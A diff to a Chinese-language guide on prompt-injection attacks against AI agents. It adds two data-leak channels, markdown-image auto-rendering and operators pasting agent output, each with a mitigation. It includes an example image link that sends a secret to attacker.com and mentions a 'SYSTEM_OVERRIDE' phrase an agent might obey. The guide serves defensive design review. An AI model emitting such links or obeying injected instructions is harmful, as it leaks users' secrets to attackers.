@@ -104,8 +104,13 @@ Agent 可能把 `SYSTEM_OVERRIDE: ...` 当指令执行。
 - 让 Agent 把敏感信息拼成 URL 参数，再让它"帮我打开这个链接"
 - 让 Agent 调用 `send_email` 工具把数据发到外部邮箱
 - 让 Agent 把数据写进它能访问的日志 / 评论 / 文件，攻击者后续读取
+- **Markdown image 自动渲染**：让 Agent 在回答里嵌入 `![log](http://attacker.com/x?data=<secret>)`，凡是 Web / Notion / Slack / 邮件这类**自动渲染 markdown**的前端，浏览器拉图时就把数据带出去——这是过去两年最高频出现的 AI exfil 漏洞，Anthropic / Microsoft / 各家文档协作产品都中过。**缓解**：渲染层只允许白名单 host 的 image src；或解析时改成需手动点击。
+- **人作为 egress hop**：操作者把 Agent 回答粘贴到工单 / chat / 邮件，Agent 没"发出去"但数据通过人转出了组织边界。这类**人传人的外泄**完全绕开技术防御。**缓解**：输出层做 PII / secret 扫描；高敏感场景给输出加水印；流程上培训操作者。
 
 这是**致命三角的"外泄通道"在实战中的样子**。
+
+> [!IMPORTANT]
+> **CLI demo 安全 ≠ Web 产品安全**：第 1-3 类外泄通道（URL / send_email / 写文件）在 CLI 阶段就要防；第 4-5 类（markdown img / 人传人）在 CLI 阶段不存在，但产品演化到 web / chat / 邮件集成时**默认就打开了**。架构评审时这两类必须显式问。
 
 ### 类别 E · Agent Loop 劫持
 
